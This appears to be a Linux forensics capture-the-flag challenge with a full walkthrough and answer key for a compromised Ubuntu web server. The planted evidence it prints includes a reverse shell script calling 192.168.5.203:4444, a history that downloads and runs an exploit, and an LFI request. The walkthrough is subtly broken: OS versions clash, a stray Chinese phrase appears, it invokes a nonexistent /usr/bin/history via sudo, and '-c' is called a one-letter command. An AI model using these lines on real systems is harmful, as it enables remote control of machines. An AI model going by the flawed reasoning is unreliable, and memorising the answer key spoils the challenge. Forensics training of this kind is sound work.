### **Digital Forensic Challenge 1: "The Curious Case of the Compromised Web Server"**

**Category:** Digital Forensics (Linux)
**Difficulty:** Medium
**Estimated Time:** 90 minutes
**Author:** SAPEU (SALEM), Oleg Usenko
**Date:** Circa 2009/2014

#### **Challenge Description**

Hello, Folks.

We are responding to an incident on one of our public-facing web servers, `ubuntu-server`. The system administrator noticed suspicious network traffic and pulled the plug. He has provided you with a live CD boot image of the server's disk.

Your task is to analyze the image and answer the following questions:

1.  **Initial Access:** How did the attacker initially gain a foothold on the system? Provide the exact method and the vulnerable component.
2.  **Persistence:** What is the full path to the file the attacker created to maintain persistence?
3.  **Data Exfiltration:** What is the IP address and the port number the attacker was using to exfiltrate data from the system?
4.  **The Mole:** The attacker created a new user account for backdoor access. What is the username?
5.  **Covering Tracks:** What is the one-letter command the attacker used to try and clear their tracks from the log files?

**You will be provided with terminal access to the mounted filesystem. Good luck.**

---

### **Investigation Scenario & Step-by-Step Solution**

**Note for the Organizer:** The VM for this challenge should be based on **Ubuntu Server 14.04 LTS**. The following artifacts need to be planted on the system before giving it to players.

---

### **Step 1: Initial Reconnaissance & User Account Analysis**

The first step is to look for obvious signs of compromise, like new user accounts or suspicious commands in history files.

**Command Input & Terminal Output:**
```bash
# First, get a general idea of the system. Check the OS version.
$ cat /etc/os-release
# Or for older systems:
$ cat /etc/issue
# Output: Ubuntu 09.04.6 LTS \n \l

# Check all user accounts from /etc/passwd that have a login shell.
$ cat /etc/passwd | grep -v "/nologin\|/false"
# ... (normal output: root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, nobody, systemd-timesync, systemd-network, systemd-resolve, messagebus, syslog, _apt, uuidd, sshd)
# ... (suspicious output at the end!)
johnysec:x:1001:1001:,,,:/home/johnysec:/bin/bash

# Found it! Answer for Question 4: The username is `johnysec`.
```

### **Step 2: Analyzing Bash History**

The attacker's actions are often recorded in the bash history. We should check for all users, especially root and any newly created ones.

**Command Input & Terminal Output:**
```bash
# Check the root user's history. Often attackers become root.
$ sudo cat /root/.bash_history
# Output might be cleaned, but let's see...
# (Output is likely empty or cleared)

# Check the history for the default user (often 'ubuntu' or the system user).
$ cat /home/ubuntu/.bash_history
# ... normal commands for admin...
# ... and then something weird:
sudo apt-get update
sudo apt-get install php5-cli
wget http://malicious-site.net/scripts/exploit.tar.gz
tar -zxvf exploit.tar.gz
cd exploit
chmod +x bypass.sh
./bypass.sh
# ... more commands ...
exit

# The www-data user is often the first point of entry for web attacks.
$ sudo cat /home/www-data/.bash_history
# Or, since www-data usually has /bin/false as a shell, its history might not exist. Check the last commands for any user:
$ last
# This shows login history. Look for suspicious TTYs or IPs.
```

*   **Finding:** The initial attack vector seems to be related to a web exploit (`wget`ing an exploit script). The user `ubuntu` ran the exploit. But the history might be incomplete.

### **Step 3: Investigating Processes and Cron Jobs**

Attackers often establish persistence through cron jobs or installed services.

**Command Input & Terminal Output:**
```bash
# Look for unusual cron jobs. Focus on system-wide crontabs.
$ sudo cat /etc/crontab
# ... normal jobs...
# * * * * * root /tmp/.X11-unix/.rsync/bin/run >/dev/null 2>&1

# Bingo! There's a malicious cron job running every minute as root.
# Answer for Question 2: The full path is `/tmp/.X11-unix/.rsync/bin/run`.

# Let's see what's in that directory. It's hidden in /tmp, a common trick.
$ ls -la /tmp/.X11-unix/
# Output:
# drwx------  2 root root 4096 Apr  9 03:14 .rsync

$ ls -la /tmp/.X11-unix/.rsync/bin/
# Output:
# -rwxr-xr-x 1 root root 1232 Apr  9 03:14 run
```

### **Step 4: Analyzing the Persistence Script**

We found the persistence mechanism. Now let's see what it does.

**Command Input & Terminal Output:**
```bash
# Examine the malicious script.
$ sudo cat /tmp/.X11-unix/.rsync/bin/run
#!/bin/bash
# Simple reverse shell backdoor
bash -i >& /dev/tcp/192.168.5.203/4444 0>&1 &

# Answer for Question 3: The exfiltration IP is `192.168.5.203` on port `4444`. This is a classic reverse shell.

# The script might also have more functionality, like downloading additional tools.
```

### **Step 5: Finding the Initial Vulnerability**

How did the attacker get in to run those initial commands? We need to look at web server logs and configuration. Since it's a web server, let's check its logs. Common locations are `/var/log/apache2/` or `/var/log/nginx/`.

**Command Input & Terminal Output:**
```bash
# Check the Apache2 access log for suspicious requests.
$ sudo tail -n 100 /var/log/apache2/access.log | grep -v "GET / HTTP"
# ... look for POST requests to unusual URLs, long parameters, etc.
# ... (After some searching) ...
192.168.5.203 - - [09/Apr/2014:03:12:17 -0400] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0"
192.168.5.203 - - [09/Apr/2014:03:13:05 -0400] "POST /admin/upload.php HTTP/1.1" 200 456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0"

# The first line shows a Local File Inclusion (LFI) attempt. The second shows a file upload to an admin page.

# Check the error log for more clues.
$ sudo grep -i "upload" /var/log/apache2/error.log
# ...可能会有 PHP warnings about file uploads...

# The most likely initial access was a compromised web application, likely via a file upload vulnerability in `upload.php` that allowed the attacker to upload a PHP shell (e.g., `exploit.tar.gz` containing a web shell) and then execute it. This matches the wget command found earlier.
# Answer for Question 1: The initial access was via a file upload vulnerability in `/admin/upload.php`.
```

### **Step 6: Looking for Cover-Up Attempts**

Finally, let's see if the attacker tried to hide their activity.

**Command Input & Terminal Output:**
```bash
# The root history was empty. This is suspicious. Let's check the last command before it was cleared.
$ sudo cat /root/.bash_history
# (Output is empty)

# Often, attackers use the `history -c` command to clear the current session's history, but it gets written to .bash_history on logout. Alternatively, they might just echo an empty string into the file.
# A more thorough technique is to use a tool like `shred` or just `rm` the file, but let's check the system-wide command history for all users, stored in the auth log.

$ sudo grep -i "COMMAND" /var/log/auth.log | tail -20
# ... look for commands run via sudo...
Apr  9 03:15:12 ubuntu-server-09 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/history -c
# Found it! The attacker used the `history` command with the `-c` (clear) flag.
# Answer for Question 5: The one-letter command is `-c`.
```

---

### **Summary of Answers for the Challenge 1**

1.  **Initial Access:** File upload vulnerability in `/admin/upload.php`.
2.  **Persistence:** `/tmp/.X11-unix/.rsync/bin/run`
3.  **Data Exfiltration:** `192.168.5.203:4444`
4.  **The Mole:** `johnysec`
5.  **Covering Tracks:** `-c` (The option used in `history -c`)

